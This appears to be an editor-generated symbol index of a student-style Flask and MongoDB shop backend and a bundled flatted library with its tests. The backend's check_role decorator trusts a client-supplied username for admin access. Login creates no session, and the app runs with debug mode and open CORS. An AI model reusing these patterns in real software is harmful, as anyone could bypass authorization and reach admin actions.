[
    {
        "label": "Flask",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "request",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "jsonify",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "Flask",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "request",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "jsonify",
        "importPath": "flask",
        "description": "flask",
        "isExtraImport": true,
        "detail": "flask",
        "documentation": {}
    },
    {
        "label": "PyMongo",
        "importPath": "flask_pymongo",
        "description": "flask_pymongo",
        "isExtraImport": true,
        "detail": "flask_pymongo",
        "documentation": {}
    },
    {
        "label": "PyMongo",
        "importPath": "flask_pymongo",
        "description": "flask_pymongo",
        "isExtraImport": true,
        "detail": "flask_pymongo",
        "documentation": {}
    },
    {
        "label": "Bcrypt",
        "importPath": "flask_bcrypt",
        "description": "flask_bcrypt",
        "isExtraImport": true,
        "detail": "flask_bcrypt",
        "documentation": {}
    },
    {
        "label": "Bcrypt",
        "importPath": "flask_bcrypt",
        "description": "flask_bcrypt",
        "isExtraImport": true,
        "detail": "flask_bcrypt",
        "documentation": {}
    },
    {
        "label": "Config",
        "importPath": "config",
        "description": "config",
        "isExtraImport": true,
        "detail": "config",
        "documentation": {}
    },
    {
        "label": "create_user",
        "importPath": "models",
        "description": "models",
        "isExtraImport": true,
        "detail": "models",
        "documentation": {}
    },
    {
        "label": "create_product",
        "importPath": "models",
        "description": "models",
        "isExtraImport": true,
        "detail": "models",
        "documentation": {}
    },
    {
        "label": "get_product_by_id",
        "importPath": "models",
        "description": "models",
        "isExtraImport": true,
        "detail": "models",
        "documentation": {}
    },
    {
        "label": "delete_product_by_id",
        "importPath": "models",
        "description": "models",
        "isExtraImport": true,
        "detail": "models",
        "documentation": {}
    },
    {
        "label": "update_or_add_cart_item",
        "importPath": "models",
        "description": "models",
        "isExtraImport": true,
        "detail": "models",
        "documentation": {}
    },
    {
        "label": "remove_from_cart",
        "importPath": "models",
        "description": "models",
        "isExtraImport": true,
        "detail": "models",
        "documentation": {}
    },
    {
        "label": "get_cart",
        "importPath": "models",
        "description": "models",
        "isExtraImport": true,
        "detail": "models",
        "documentation": {}
    },
    {
        "label": "clear_cart",
        "importPath": "models",
        "description": "models",
        "isExtraImport": true,
        "detail": "models",
        "documentation": {}
    },
    {
        "label": "mongo",
        "importPath": "models",
        "description": "models",
        "isExtraImport": true,
        "detail": "models",
        "documentation": {}
    },
    {
        "label": "check_role",
        "importPath": "utils",
        "description": "utils",
        "isExtraImport": true,
        "detail": "utils",
        "documentation": {}
    },
    {
        "label": "CORS",
        "importPath": "flask_cors",
        "description": "flask_cors",
        "isExtraImport": true,
        "detail": "flask_cors",
        "documentation": {}
    },
    {
        "label": "ObjectId",
        "importPath": "bson",
        "description": "bson",
        "isExtraImport": true,
        "detail": "bson",
        "documentation": {}
    },
    {
        "label": "wraps",
        "importPath": "functools",
        "description": "functools",
        "isExtraImport": true,
        "detail": "functools",
        "documentation": {}
    },
    {
        "label": "json",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "json",
        "description": "json",
        "detail": "json",
        "documentation": {}
    },
    {
        "label": "stringify",
        "importPath": "flatted",
        "description": "flatted",
        "isExtraImport": true,
        "detail": "flatted",
        "documentation": {}
    },
    {
        "label": "parse",
        "importPath": "flatted",
        "description": "flatted",
        "isExtraImport": true,
        "detail": "flatted",
        "documentation": {}
    },
    {
        "label": "os",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os",
        "description": "os",
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "TelegramClient",
        "importPath": "telethon",
        "description": "telethon",
        "isExtraImport": true,
        "detail": "telethon",
        "documentation": {}
    },
    {
        "label": "events",
        "importPath": "telethon",
        "description": "telethon",
        "isExtraImport": true,
        "detail": "telethon",
        "documentation": {}
    },
    {
        "label": "TelegramClient",
        "importPath": "telethon",
        "description": "telethon",
        "isExtraImport": true,
        "detail": "telethon",
        "documentation": {}
    },
    {
        "label": "events",
        "importPath": "telethon",
        "description": "telethon",
        "isExtraImport": true,
        "detail": "telethon",
        "documentation": {}
    },
    {
        "label": "re",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "re",
        "description": "re",
        "detail": "re",
        "documentation": {}
    },
    {
        "label": "requests",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "requests",
        "description": "requests",
        "detail": "requests",
        "documentation": {}
    },
    {
        "label": "register",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def register():\n    data = request.json\n    result = create_user(data['username'], data['email'], data['password'])\n    return jsonify(result)\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.json\n    user = mongo.db.users.find_one({'username': data.get('username')})\n    if user and bcrypt.check_password_hash(user['password'], data['password']):\n        return jsonify({\"message\": \"Login successful\"}), 200",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "login",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def login():\n    data = request.json\n    user = mongo.db.users.find_one({'username': data.get('username')})\n    if user and bcrypt.check_password_hash(user['password'], data['password']):\n        return jsonify({\"message\": \"Login successful\"}), 200\n    return jsonify({\"error\": \"Invalid credentials\"}), 401\n@app.route('/products', methods=['POST'])\n@check_role('admin')\ndef add_product():\n    data = request.json",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "add_product",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def add_product():\n    data = request.json\n    result = create_product(data['title'], data['price'], data.get('description', ''), data.get('image', ''), data.get('rating'))\n    return jsonify(result)\n@app.route('/products', methods=['GET'])\ndef get_products():\n    products = mongo.db.products.find()\n    result = []\n    for product in products:\n        result.append({",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "get_products",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def get_products():\n    products = mongo.db.products.find()\n    result = []\n    for product in products:\n        result.append({\n            \"id\": str(product[\"_id\"]),\n            \"title\": product[\"title\"],\n            \"price\": product[\"price\"],\n            \"description\": product[\"description\"],\n            \"image\": product[\"image\"],",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "get_product",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def get_product(product_id):\n    product = get_product_by_id(product_id)\n    if \"error\" in product:\n        return jsonify(product), 404\n    return jsonify(product)\n@app.route('/cart', methods=['POST'])\ndef add_to_cart_route():\n    data = request.json\n    result = update_or_add_cart_item(data['username'], data['product_id'], 1)  # Mặc định thêm 1 sản phẩm\n    return jsonify(result)",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "add_to_cart_route",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def add_to_cart_route():\n    data = request.json\n    result = update_or_add_cart_item(data['username'], data['product_id'], 1)  # Mặc định thêm 1 sản phẩm\n    return jsonify(result)\n@app.route('/cart', methods=['PUT'])\ndef update_or_add_to_cart():\n    data = request.json\n    result = update_or_add_cart_item(data['username'], data['product_id'], data['quantity'])\n    return jsonify(result)\n@app.route('/cart', methods=['DELETE'])",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "update_or_add_to_cart",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def update_or_add_to_cart():\n    data = request.json\n    result = update_or_add_cart_item(data['username'], data['product_id'], data['quantity'])\n    return jsonify(result)\n@app.route('/cart', methods=['DELETE'])\ndef remove_from_cart_route():\n    data = request.json\n    result = remove_from_cart(data['username'], data['product_id'])\n    return jsonify(result)\n@app.route('/cart', methods=['GET'])",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "remove_from_cart_route",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def remove_from_cart_route():\n    data = request.json\n    result = remove_from_cart(data['username'], data['product_id'])\n    return jsonify(result)\n@app.route('/cart', methods=['GET'])\ndef view_cart():\n    username = request.args.get('username')\n    result = get_cart(username)\n    return jsonify(result)\n@app.route('/checkout', methods=['POST'])",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "view_cart",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def view_cart():\n    username = request.args.get('username')\n    result = get_cart(username)\n    return jsonify(result)\n@app.route('/checkout', methods=['POST'])\ndef checkout():\n    data = request.json\n    result = clear_cart(data['username'])\n    return jsonify(result)\nif __name__ == '__main__':",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "checkout",
        "kind": 2,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "def checkout():\n    data = request.json\n    result = clear_cart(data['username'])\n    return jsonify(result)\nif __name__ == '__main__':\n    app.run(debug=True)",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "app",
        "kind": 5,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "app = Flask(__name__)\nCORS(app)  # This allows requests from any origin\napp.config.from_object(Config)\nmongo = PyMongo(app)\nbcrypt = Bcrypt(app)\n@app.route('/register', methods=['POST'])\ndef register():\n    data = request.json\n    result = create_user(data['username'], data['email'], data['password'])\n    return jsonify(result)",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "mongo",
        "kind": 5,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "mongo = PyMongo(app)\nbcrypt = Bcrypt(app)\n@app.route('/register', methods=['POST'])\ndef register():\n    data = request.json\n    result = create_user(data['username'], data['email'], data['password'])\n    return jsonify(result)\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.json",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "bcrypt",
        "kind": 5,
        "importPath": "backend.app",
        "description": "backend.app",
        "peekOfCode": "bcrypt = Bcrypt(app)\n@app.route('/register', methods=['POST'])\ndef register():\n    data = request.json\n    result = create_user(data['username'], data['email'], data['password'])\n    return jsonify(result)\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.json\n    user = mongo.db.users.find_one({'username': data.get('username')})",
        "detail": "backend.app",
        "documentation": {}
    },
    {
        "label": "Config",
        "kind": 6,
        "importPath": "backend.config",
        "description": "backend.config",
        "peekOfCode": "class Config:\n    MONGO_URI = \"mongodb://localhost:27017/ecommerce\"  # Đổi URL nếu MongoDB đang chạy ở địa chỉ khác",
        "detail": "backend.config",
        "documentation": {}
    },
    {
        "label": "create_user",
        "kind": 2,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "def create_user(username, email, password, role='user'):\n    if mongo.db.users.find_one({'username': username}):\n        return {\"error\": \"Username already exists\"}\n    hashed_password = bcrypt.generate_password_hash(password).decode('utf-8')\n    mongo.db.users.insert_one({\n        'username': username,\n        'email': email,\n        'password': hashed_password,\n        'role': role\n    })",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "create_product",
        "kind": 2,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "def create_product(title, price, description='', image='', rating=None):\n    if rating is None:\n        rating = {\"rate\": 0, \"count\": 0}\n    mongo.db.products.insert_one({\n        \"title\": title,\n        \"price\": price,\n        \"description\": description,\n        \"image\": image,\n        \"rating\": rating\n    })",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "get_product_by_id",
        "kind": 2,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "def get_product_by_id(product_id):\n    product = mongo.db.products.find_one({'_id': ObjectId(product_id)})  # Sửa dòng này\n    if product:\n        return {\n            \"id\": str(product[\"_id\"]),\n            \"title\": product[\"title\"],\n            \"price\": product[\"price\"],\n            \"description\": product[\"description\"],\n            \"image\": product[\"image\"],\n            \"rating\": product[\"rating\"]",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "delete_product_by_id",
        "kind": 2,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "def delete_product_by_id(product_id):\n    result = mongo.db.products.delete_one({\"_id\": ObjectId(product_id)})  # Sửa dòng này\n    if result.deleted_count > 0:\n        return {\"message\": \"Product deleted successfully\"}\n    return {\"error\": \"Product not found\"}\ndef update_or_add_cart_item(username, product_id, quantity):\n    user = mongo.db.users.find_one({'username': username})\n    if not user:\n        return {\"error\": \"User not found\"}\n    cart = mongo.db.carts.find_one({'username': username})",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "update_or_add_cart_item",
        "kind": 2,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "def update_or_add_cart_item(username, product_id, quantity):\n    user = mongo.db.users.find_one({'username': username})\n    if not user:\n        return {\"error\": \"User not found\"}\n    cart = mongo.db.carts.find_one({'username': username})\n    if not cart:\n        # Nếu giỏ hàng chưa tồn tại, tạo mới\n        cart = {'username': username, 'products': []}\n    # Tìm sản phẩm trong giỏ hàng\n    product = next((item for item in cart.get('products', []) if item['id'] == product_id), None)",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "remove_from_cart",
        "kind": 2,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "def remove_from_cart(username, product_id):\n    user = mongo.db.users.find_one({'username': username})\n    if not user:\n        return {\"error\": \"User not found\"}\n    mongo.db.carts.update_one(\n        {'username': username},\n        {'$pull': {'products': product_id}}\n    )\n    return {\"message\": \"Product removed from cart\"}\ndef get_cart(username):",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "get_cart",
        "kind": 2,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "def get_cart(username):\n    user = mongo.db.users.find_one({'username': username})\n    if not user:\n        return {\"error\": \"User not found\"}\n    cart = mongo.db.carts.find_one({'username': username})\n    if not cart:\n        return {\"products\": []}\n    products = []\n    for cart_item in cart.get('products', []):\n        product = mongo.db.products.find_one({'_id': ObjectId(cart_item['id'])})",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "clear_cart",
        "kind": 2,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "def clear_cart(username):\n    user = mongo.db.users.find_one({'username': username})\n    if not user:\n        return {\"error\": \"User not found\"}\n    result = mongo.db.carts.delete_one({'username': username})\n    if result.deleted_count > 0:\n        return {\"message\": \"Cart cleared\"}\n    else:\n        return {\"message\": \"Cart was already empty\"}",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "app",
        "kind": 5,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "app = Flask(__name__)\napp.config.from_object('config.Config')\nmongo = PyMongo(app)\nbcrypt = Bcrypt(app)\ndef create_user(username, email, password, role='user'):\n    if mongo.db.users.find_one({'username': username}):\n        return {\"error\": \"Username already exists\"}\n    hashed_password = bcrypt.generate_password_hash(password).decode('utf-8')\n    mongo.db.users.insert_one({\n        'username': username,",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "mongo",
        "kind": 5,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "mongo = PyMongo(app)\nbcrypt = Bcrypt(app)\ndef create_user(username, email, password, role='user'):\n    if mongo.db.users.find_one({'username': username}):\n        return {\"error\": \"Username already exists\"}\n    hashed_password = bcrypt.generate_password_hash(password).decode('utf-8')\n    mongo.db.users.insert_one({\n        'username': username,\n        'email': email,\n        'password': hashed_password,",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "bcrypt",
        "kind": 5,
        "importPath": "backend.models",
        "description": "backend.models",
        "peekOfCode": "bcrypt = Bcrypt(app)\ndef create_user(username, email, password, role='user'):\n    if mongo.db.users.find_one({'username': username}):\n        return {\"error\": \"Username already exists\"}\n    hashed_password = bcrypt.generate_password_hash(password).decode('utf-8')\n    mongo.db.users.insert_one({\n        'username': username,\n        'email': email,\n        'password': hashed_password,\n        'role': role",
        "detail": "backend.models",
        "documentation": {}
    },
    {
        "label": "check_role",
        "kind": 2,
        "importPath": "backend.utils",
        "description": "backend.utils",
        "peekOfCode": "def check_role(role):\n    def decorator(f):\n        @wraps(f)\n        def wrapper(*args, **kwargs):\n            username = request.json.get('username')\n            user = mongo.db.users.find_one({'username': username})\n            if user and user.get('role') == role:\n                return f(*args, **kwargs)\n            return jsonify({\"error\": \"Unauthorized\"}), 403\n        return wrapper",
        "detail": "backend.utils",
        "documentation": {}
    },
    {
        "label": "_Known",
        "kind": 6,
        "importPath": "beestore.node_modules.flatted.python.flatted",
        "description": "beestore.node_modules.flatted.python.flatted",
        "peekOfCode": "class _Known:\n    def __init__(self):\n        self.key = []\n        self.value = []\nclass _String:\n    def __init__(self, value):\n        self.value = value\ndef _array_keys(value):\n    keys = []\n    i = 0",
        "detail": "beestore.node_modules.flatted.python.flatted",
        "documentation": {}
    },
    {
        "label": "_String",
        "kind": 6,
        "importPath": "beestore.node_modules.flatted.python.flatted",
        "description": "beestore.node_modules.flatted.python.flatted",
        "peekOfCode": "class _String:\n    def __init__(self, value):\n        self.value = value\ndef _array_keys(value):\n    keys = []\n    i = 0\n    for _ in value:\n        keys.append(i)\n        i += 1\n    return keys",
        "detail": "beestore.node_modules.flatted.python.flatted",
        "documentation": {}
    },
    {
        "label": "parse",
        "kind": 2,
        "importPath": "beestore.node_modules.flatted.python.flatted",
        "description": "beestore.node_modules.flatted.python.flatted",
        "peekOfCode": "def parse(value, *args, **kwargs):\n    json = _json.loads(value, *args, **kwargs)\n    wrapped = []\n    for value in json:\n        wrapped.append(_wrap(value))\n    input = []\n    for value in wrapped:\n        if isinstance(value, _String):\n            input.append(value.value)\n        else:",
        "detail": "beestore.node_modules.flatted.python.flatted",
        "documentation": {}
    },
    {
        "label": "stringify",
        "kind": 2,
        "importPath": "beestore.node_modules.flatted.python.flatted",
        "description": "beestore.node_modules.flatted.python.flatted",
        "peekOfCode": "def stringify(value, *args, **kwargs):\n    known = _Known()\n    input = []\n    output = []\n    i = int(_index(known, input, value))\n    while i < len(input):\n        output.append(_transform(known, input, input[i]))\n        i += 1\n    return _json.dumps(output, *args, **kwargs)",
        "detail": "beestore.node_modules.flatted.python.flatted",
        "documentation": {}
    },
    {
        "label": "stringify",
        "kind": 2,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "def stringify(value):\n    return _stringify(value, separators=(',', ':'))\nassert stringify([None, None]) == '[[null,null]]'\na = []\no = {}\nassert stringify(a) == '[[]]'\nassert stringify(o) == '[{}]'\na.append(a)\no['o'] = o\nassert stringify(a) == '[[\"0\"]]'",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "a",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "a = []\no = {}\nassert stringify(a) == '[[]]'\nassert stringify(o) == '[{}]'\na.append(a)\no['o'] = o\nassert stringify(a) == '[[\"0\"]]'\nassert stringify(o) == '[{\"o\":\"0\"}]'\nb = parse(stringify(a))\nassert isinstance(b, list) and b[0] == b",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "o",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "o = {}\nassert stringify(a) == '[[]]'\nassert stringify(o) == '[{}]'\na.append(a)\no['o'] = o\nassert stringify(a) == '[[\"0\"]]'\nassert stringify(o) == '[{\"o\":\"0\"}]'\nb = parse(stringify(a))\nassert isinstance(b, list) and b[0] == b\na.append(1)",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "o['o']",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "o['o'] = o\nassert stringify(a) == '[[\"0\"]]'\nassert stringify(o) == '[{\"o\":\"0\"}]'\nb = parse(stringify(a))\nassert isinstance(b, list) and b[0] == b\na.append(1)\na.append('two')\na.append(True)\no['one'] = 1\no['two'] = 'two'",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "b",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "b = parse(stringify(a))\nassert isinstance(b, list) and b[0] == b\na.append(1)\na.append('two')\na.append(True)\no['one'] = 1\no['two'] = 'two'\no['three'] = True\nassert stringify(a) == '[[\"0\",1,\"1\",true],\"two\"]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true},\"two\"]'",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "o['one']",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "o['one'] = 1\no['two'] = 'two'\no['three'] = True\nassert stringify(a) == '[[\"0\",1,\"1\",true],\"two\"]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true},\"two\"]'\na.append(o)\no['a'] = a\nassert stringify(a) == '[[\"0\",1,\"1\",true,\"2\"],\"two\",{\"o\":\"2\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"0\"}]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"2\"},\"two\",[\"2\",1,\"1\",true,\"0\"]]'\na.append({'test': 'OK'})",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "o['two']",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "o['two'] = 'two'\no['three'] = True\nassert stringify(a) == '[[\"0\",1,\"1\",true],\"two\"]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true},\"two\"]'\na.append(o)\no['a'] = a\nassert stringify(a) == '[[\"0\",1,\"1\",true,\"2\"],\"two\",{\"o\":\"2\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"0\"}]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"2\"},\"two\",[\"2\",1,\"1\",true,\"0\"]]'\na.append({'test': 'OK'})\na.append([1, 2, 3])",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "o['three']",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "o['three'] = True\nassert stringify(a) == '[[\"0\",1,\"1\",true],\"two\"]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true},\"two\"]'\na.append(o)\no['a'] = a\nassert stringify(a) == '[[\"0\",1,\"1\",true,\"2\"],\"two\",{\"o\":\"2\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"0\"}]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"2\"},\"two\",[\"2\",1,\"1\",true,\"0\"]]'\na.append({'test': 'OK'})\na.append([1, 2, 3])\no['test'] = {'test': 'OK'}",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "o['a']",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "o['a'] = a\nassert stringify(a) == '[[\"0\",1,\"1\",true,\"2\"],\"two\",{\"o\":\"2\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"0\"}]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"2\"},\"two\",[\"2\",1,\"1\",true,\"0\"]]'\na.append({'test': 'OK'})\na.append([1, 2, 3])\no['test'] = {'test': 'OK'}\no['array'] = [1, 2, 3]\nassert stringify(a) == '[[\"0\",1,\"1\",true,\"2\",\"3\",\"4\"],\"two\",{\"o\":\"2\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"0\",\"test\":\"3\",\"array\":\"4\"},{\"test\":\"5\"},[1,2,3],\"OK\"]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"2\",\"test\":\"3\",\"array\":\"4\"},\"two\",[\"2\",1,\"1\",true,\"0\",\"3\",\"4\"],{\"test\":\"5\"},[1,2,3],\"OK\"]'\na2 = parse(stringify(a));",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "o['test']",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "o['test'] = {'test': 'OK'}\no['array'] = [1, 2, 3]\nassert stringify(a) == '[[\"0\",1,\"1\",true,\"2\",\"3\",\"4\"],\"two\",{\"o\":\"2\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"0\",\"test\":\"3\",\"array\":\"4\"},{\"test\":\"5\"},[1,2,3],\"OK\"]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"2\",\"test\":\"3\",\"array\":\"4\"},\"two\",[\"2\",1,\"1\",true,\"0\",\"3\",\"4\"],{\"test\":\"5\"},[1,2,3],\"OK\"]'\na2 = parse(stringify(a));\no2 = parse(stringify(o));\nassert a2[0] == a2\nassert o2['o'] == o2\nassert a2[1] == 1 and a2[2] == 'two' and a2[3] == True and isinstance(a2[4], dict)\nassert a2[4] == a2[4]['o'] and a2 == a2[4]['o']['a']",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "o['array']",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "o['array'] = [1, 2, 3]\nassert stringify(a) == '[[\"0\",1,\"1\",true,\"2\",\"3\",\"4\"],\"two\",{\"o\":\"2\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"0\",\"test\":\"3\",\"array\":\"4\"},{\"test\":\"5\"},[1,2,3],\"OK\"]'\nassert stringify(o) == '[{\"o\":\"0\",\"one\":1,\"two\":\"1\",\"three\":true,\"a\":\"2\",\"test\":\"3\",\"array\":\"4\"},\"two\",[\"2\",1,\"1\",true,\"0\",\"3\",\"4\"],{\"test\":\"5\"},[1,2,3],\"OK\"]'\na2 = parse(stringify(a));\no2 = parse(stringify(o));\nassert a2[0] == a2\nassert o2['o'] == o2\nassert a2[1] == 1 and a2[2] == 'two' and a2[3] == True and isinstance(a2[4], dict)\nassert a2[4] == a2[4]['o'] and a2 == a2[4]['o']['a']\nstr = parse('[{\"prop\":\"1\",\"a\":\"2\",\"b\":\"3\"},{\"value\":123},[\"4\",\"5\"],{\"e\":\"6\",\"t\":\"7\",\"p\":4},{},{\"b\":\"8\"},\"f\",{\"a\":\"9\"},[\"10\"],\"sup\",{\"a\":1,\"d\":2,\"c\":\"7\",\"z\":\"11\",\"h\":1},{\"g\":2,\"a\":\"7\",\"b\":\"12\",\"f\":6},{\"r\":4,\"u\":\"7\",\"c\":5}]')",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "a2",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "a2 = parse(stringify(a));\no2 = parse(stringify(o));\nassert a2[0] == a2\nassert o2['o'] == o2\nassert a2[1] == 1 and a2[2] == 'two' and a2[3] == True and isinstance(a2[4], dict)\nassert a2[4] == a2[4]['o'] and a2 == a2[4]['o']['a']\nstr = parse('[{\"prop\":\"1\",\"a\":\"2\",\"b\":\"3\"},{\"value\":123},[\"4\",\"5\"],{\"e\":\"6\",\"t\":\"7\",\"p\":4},{},{\"b\":\"8\"},\"f\",{\"a\":\"9\"},[\"10\"],\"sup\",{\"a\":1,\"d\":2,\"c\":\"7\",\"z\":\"11\",\"h\":1},{\"g\":2,\"a\":\"7\",\"b\":\"12\",\"f\":6},{\"r\":4,\"u\":\"7\",\"c\":5}]')\nassert str['b']['t']['a'] == 'sup' and str['a'][1]['b'][0]['c'] == str['b']['t']\noo = parse('[{\"a\":\"1\",\"b\":\"0\",\"c\":\"2\"},{\"aa\":\"3\"},{\"ca\":\"4\",\"cb\":\"5\",\"cc\":\"6\",\"cd\":\"7\",\"ce\":\"8\",\"cf\":\"9\"},{\"aaa\":\"10\"},{\"caa\":\"4\"},{\"cba\":\"5\"},{\"cca\":\"2\"},{\"cda\":\"4\"},\"value2\",\"value3\",\"value1\"]');\nassert oo['a']['aa']['aaa'] == 'value1' and oo == oo['b'] and oo['c']['ca']['caa'] == oo['c']['ca']",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "o2",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
